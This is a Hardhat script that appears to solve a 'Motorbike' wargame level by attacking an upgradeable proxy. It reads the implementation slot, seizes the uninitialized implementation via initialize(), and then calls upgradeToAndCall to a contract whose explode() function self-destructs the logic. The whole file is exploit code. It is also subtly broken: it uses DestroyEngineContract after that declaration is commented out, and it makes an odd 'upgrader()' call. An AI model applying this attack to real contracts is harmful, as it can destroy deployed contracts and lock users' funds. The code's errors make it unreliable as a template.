const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0xC19Ac624341D8e5812e8e4bAAa0D43e0F06122e1";
  const IMPLEMENTATION_SLOT =
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
  // const MotorbikeContract = await ethers.getContractFactory("Motorbike");
  // const Motorbike = MotorbikeContract.attach(Instance);
  // const DestroyEngineContract = await ethers.getContractFactory(
  //   "DestroyEngine"
  // );
  const DestroyEngine = await DestroyEngineContract.deploy();
  console.log(DestroyEngine);
  await DestroyEngine.deployed();
  console.log(DestroyEngine.address);
  const addr = await ethers.provider.getStorageAt(
    Instance,
    IMPLEMENTATION_SLOT
  );
  // const addr =
  //   "0x000000000000000000000000a7421d3b797bb93f014b5f0f1c520617dd32535c";
  const slicedAddr = `0x${addr.slice(-40)}`;
  let ABI = ["function initialize()"];
  let iface = new ethers.utils.Interface(ABI);
  const data = iface.encodeFunctionData("initialize", []);
  const result = await owner.sendTransaction({
    from: owner.address,
    to: slicedAddr,
    data,
  });
  console.log(result);
  let UpgradeABI = ["function upgrader()"];
  let UpgradeIface = new ethers.utils.Interface(UpgradeABI);
  const UpgradeData = UpgradeIface.encodeFunctionData("upgrader", []);
  const UpgradeOuput = await owner.sendTransaction({
    from: owner.address,
    to: slicedAddr,
    data: UpgradeData,
  });
  console.log(UpgradeOuput, "Up");
  let ExplodeABI = ["function explode()"];
  let ExplodeIface = new ethers.utils.Interface(ExplodeABI);
  const ExplodeData = ExplodeIface.encodeFunctionData("explode");
  console.log(ExplodeData, "Ex");
  let UpgradeExplodeABI = [
    "function upgradeToAndCall(address newImplementation, bytes memory data)",
  ];
  let UpgradeExplodeIface = new ethers.utils.Interface(UpgradeExplodeABI);
  const Exploder = UpgradeExplodeIface.encodeFunctionData("upgradeToAndCall", [
    "0xafA19C725e9Eea067721E982eCbC92f1D1F1f803",
    ExplodeData,
  ]);
  console.log(Exploder, "exp");
  const destroy = await owner.sendTransaction({
    from: owner.address,
    to: slicedAddr,
    data: Exploder,
  });
  console.log(destroy, "Up");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
